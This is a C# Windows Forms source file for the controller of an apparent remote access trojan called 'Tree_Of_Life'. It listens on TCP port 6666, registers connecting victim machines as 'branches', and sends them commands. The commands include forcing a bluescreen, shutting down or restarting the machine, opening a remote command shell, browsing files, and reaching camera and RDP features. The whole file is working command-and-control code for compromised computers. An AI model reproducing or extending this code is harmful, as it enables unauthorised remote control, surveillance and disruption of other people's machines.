using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.Collections;
using System.IO;

namespace Tree_Of_Life
{
    public partial class Form1 : Form
    {
        private Socket socket;
        private TcpListener listener;
        private List<Branch> Branches = new List<Branch>();
        private int i = 1;

        private enum cmds
        {
            Message = 1, Beep = 2, BlueScreen = 3, Shutdown = 4, Ping = 5, FileExplorer = 6, CMD = 7,
            Camera = 8, RDP = 9, Kill = 10, Restart = 11, Chat = 12
        }

        public Form1()
        {
            InitializeComponent();
        }

        private void Start_Click(object sender, EventArgs e)
        {
            Thread thListen = new Thread(new ThreadStart(Extend));
            thListen.Start();
        }

        public void Extend()
        {
            listener = new TcpListener(System.Net.IPAddress.Any, 6666);
            listener.Start();
            status.Text = "Tree Started...";
            for (; ; )
            {
                socket = listener.AcceptSocket();
                IPEndPoint ip = (IPEndPoint)socket.RemoteEndPoint;
                status.Text = "New Branch Received From " + ip;
                
                ConnectedBranches.Text = i.ToString();
                i++;
                
                StreamReader reader = new StreamReader(new NetworkStream(socket));

                string[] DataReceived  = reader.ReadLine().Split(',');
                string[] data = { ip.ToString(), DataReceived[0], DataReceived[1], "true", DataReceived[2]};

                Branches.Add(new Branch(data[0], data[1], data[2], bool.Parse(data[3]), data[4], socket));

                reader.Close();
                InitializeGrid(data);
            }
        }

        private delegate void InitializeGridDelegate(string[] data);
        private void InitializeGrid(string[] data)
        {
            if(this.BranchGrid.InvokeRequired)
            {
                InitializeGridDelegate initgrid = new InitializeGridDelegate(InitializeGrid);
                this.Invoke(initgrid, new object[] { data });
            }
            else
            {
                string[] temp = data.ToArray();
                BranchGrid.Rows.Add(temp);
            }
        }

        private void End_Click(object sender, EventArgs e)
        {
            CleanUp();
            status.Text = "Tree Offline";
        }

        private void CleanUp()
        {
            socket.Close();
        }

        private void Ping_Click(object sender, EventArgs e)
        {
            foreach(Branch branch in Branches)
            {
                branch.SendCommand((int)cmds.Ping);
            }
        }

        private void KillAll_Click(object sender, EventArgs e)
        {
            foreach (Branch branch in Branches)
            {
                branch.SendCommand((int)cmds.Kill);
                foreach(Branch b in Branches)
                {
                    b.online = false;
                }
            }
        }

        private Branch GetBranch(string ip)
        {
            Branch branch = null;
            foreach(Branch b in Branches)
            {
                if(b.ip.Equals(ip))
                {
                    branch = b;
                }
            }
            return branch;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            CleanUp();
            Environment.Exit(Environment.ExitCode);
        }

        private void Beep_Click(object sender, EventArgs e)
        {
            var item = BranchGrid.CurrentCell.Value;
            GetBranch(item.ToString()).SendCommand((int)cmds.Beep);
        }
        private void SendMessage_Click(object sender, EventArgs e)
        {
            var item = BranchGrid.CurrentCell.Value;
            //GetBranch(item.ToString()).Send();
        }
        private void CMD_Click(object sender, EventArgs e)
        {
            var item = BranchGrid.CurrentCell.Value;
            GetBranch(item.ToString()).GetCMD();
        }
        private void Shutdown_Click(object sender, EventArgs e)
        {
            var item = BranchGrid.CurrentCell.Value;
            GetBranch(item.ToString()).SendCommand((int)cmds.Shutdown);
        }
        private void FileExplorer_Click(object sender, EventArgs e)
        {
            var item = BranchGrid.CurrentCell.Value;
            GetBranch(item.ToString()).Explorer();
        }
        private void Restart_Click(object sender, EventArgs e)
        {
            var item = BranchGrid.CurrentCell.Value;
            GetBranch(item.ToString()).SendCommand((int)cmds.Restart);
        }
        private void Disconnect_Click(object sender, EventArgs e)
        {
            var item = BranchGrid.CurrentCell.Value;
            GetBranch(item.ToString()).SendCommand((int)cmds.Kill);
            GetBranch(item.ToString()).online = false;
        }
        private void Bluescreen_Click(object sender, EventArgs e)
        {
            var item = BranchGrid.CurrentCell.Value;
            GetBranch(item.ToString()).SendCommand((int)cmds.BlueScreen);
        }

        /*
        private void BranchGrid_CellContentDoubleClick(object sender, DataGridViewCellEventArgs e)
        {
            BranchGrid.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            string ip = BranchGrid.CurrentRow.Cells["IPAddress"].Value.ToString();

            BranchControls control = new BranchControls(ip, GetBranch(ip));
            control.Show();
        }

        private void BranchGrid_MouseClick(object sender, MouseEventArgs e)
        {

        }
        */
        private void BranchGrid_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            BranchGrid.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            string ip = BranchGrid.CurrentRow.Cells["IPAddress"].Value.ToString();
            BranchControls control = new BranchControls(ip, GetBranch(ip));
            control.Show();
        }
    }
}
